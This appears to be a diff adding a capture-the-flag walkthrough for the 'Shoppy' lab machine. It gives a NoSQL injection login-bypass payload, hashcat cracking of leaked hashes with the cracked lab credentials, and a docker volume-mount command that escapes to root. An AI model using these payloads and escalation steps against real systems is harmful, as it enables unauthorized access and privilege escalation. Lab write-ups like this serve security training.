@@ -1,0 +1,109 @@
+--------------------------------------------------OverView--------------------------------------------------
+* User-Flag: Using nosqli to bypass login and get all credential.
+			 Fuzzing subdomain and login with credential above.
+			 Looking for new credential for ssh => user-flag
+* Root-Flag: Read cpp builded file with cat => horizontal credentail(non-admin).
+			 Inner-docker privilage-escalation.
+--------------------------------------------------Tools--------------------------------------------------
+* User-Flag: MongoMap(https://github.com/Hex27/mongomap.git) => success detech
+			 NoSqlMap(https://github.com/codingo/NoSQLMap.git) => ????
+			 WFuzz or any fuzzing tool(kali default tool)
+			 bitquark-subdomains-top100000.txt
+* Root-Flag: Cat or any text reading tool (default)
+			 gtfobins.github.io => docker => shell
+--------------------------------------------------Exploit--------------------------------------------------
+* User-Flag:
+	- Check open port with naabu: naabu -host shoppy.htb
+		shoppy.htb:80 => web
+		shoppy.htb:22 => ssh
+	- Get all potencial attack surface with dirsearch: dirsearch -u shoppy.htb -e "*" -r
+		shoppy.htb:80/login
+	- MAGIC STEP using mongomap to detech mongo sqli ???
+		Burp suit with nosqliscan wanring nosqli
+	
+	- Check no sql injection: python3 mongomap.py -u http://shoppy.htb/login --method post --data "username=jaeger&password=1"
+		payload: '; return this; var dum = ' show in result as a suscessful attack.
+	- Using '; return this; var dum = ' on user name for testing => suscessful login as admin with out password.
+	
+	- Check search user feature => input admin => return json containt hash password of admin
+	
+	- Try to bruce admin password with hashcat: hashcat -a 0 -m 0 -w 4  '23c6877d9e2b564ef8b32c3a23de27b2' /usr/share/eaphammer/wordlists/rockyou.txt
+		=> none password in rockyou => seem lik a rabbit hole.
+	
+	- Using '; return this; var dum = ' on search input => get json of all user name => josh
+	
+	- Bruce user josh with hashcat: hashcat -a 0 -m 0 -w 4  '6ebcea65320589ca4f2f1ce039975995' /usr/share/eaphammer/wordlists/rockyou.txt
+		=> josh:remembermethisway
+		
+	- Try ssh josh => no suscess.
+	
+	- MAGIC STEP fuzzing other subdomain: wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.shoppy.htb" --hc 403,400,301 -t 50 10.10.11.180
+		=> found: htpp://mattermost.shoppy.htb
+		=> mattermost is an chat service => developer chat ???
+	
+	- Login as josh:remembermethisway => suscess
+	
+	- Checking all chat => Deploy machine section => jaeger:Sh0ppyBest@pp!
+	
+	- SSH: ssh jaeger@10.10.11.180 => user.txt
+	
+* Root-Flag:
+	- Check user permisson as sudo: sudo -l
+		jaeger@shoppy:~$ sudo -l
+		[sudo] password for jaeger:
+		Matching Defaults entries for jaeger on shoppy:
+			env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+		User jaeger may run the following commands on shoppy:
+			(deploy) /home/deploy/password-manager
+			
+	- Test run: sudo -H -u deploy /home/deploy/password-manager
+	
+	- Take a look at the app: ls -al /home/deploy
+		jaeger@shoppy:~$ ls -al /home/deploy/
+		total 52
+		drwxr-xr-x 3 deploy deploy  4096 Jul 23 03:34 .
+		drwxr-xr-x 4 root   root    4096 Jul 22 13:12 ..
+		lrwxrwxrwx 1 deploy deploy     9 Jul 22 13:14 .bash_history -> /dev/null
+		-rw-r--r-- 1 deploy deploy   220 Mar 27  2022 .bash_logout
+		-rw-r--r-- 1 deploy deploy  3526 Mar 27  2022 .bashrc
+		-rw------- 1 deploy deploy    56 Jul 22 13:15 creds.txt
+		lrwxrwxrwx 1 deploy deploy     9 Jul 23 03:34 .dbshell -> /dev/null
+		drwx------ 3 deploy deploy  4096 Jul 23 03:31 .gnupg
+		-rwxr--r-- 1 deploy deploy 18440 Jul 22 13:20 password-manager
+		-rw------- 1 deploy deploy   739 Feb  1  2022 password-manager.cpp
+		-rw-r--r-- 1 deploy deploy   807 Mar 27  2022 .profile
+		
+		=>the app write with c++.
+	
+	- NOT SO MAGIC STEP try to read the builded app: cat /home/deploy/password-manager (MAGIC)
+		�[]A\A]A^A_��H�H��Welcome to Josh password manager!Please enter your master password: SampleAcces                                                                                                                      
+		ss granted! Here is creds !cat /home/deploy/creds.txtAccess 
+		
+		=> seem like the app store credentail to creds.txt and look like Sample is the password (Please enter your master password: SampleAcces)
+	
+	- Run the app again and input Sample: sudo -H -u deploy /home/deploy/password-manager
+		Welcome to Josh password manager!
+		Please enter your master password: Sample
+		Access granted! Here is creds !
+		Deploy Creds :
+		username: deploy
+		password: Deploying@pp!
+		
+		=> get deploy:Deploying@pp! account
+		
+	- Swich to deploy: sudo deploy
+		=> upgrade ssti: python3 -c 'import pty; pty.spawn("/bin/bash")'
+		
+	- Test id and groups
+		=> uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
+		=> deploy docker
+		
+		=> this account can run docker
+	
+	- MAGIC STEP seem like this machine it's a container 
+		=> check: https://gtfobins.github.io/gtfobins/docker/ 
+		=> using: docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+	
+	- Run: docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+		=> root of the Docker ????? DONE
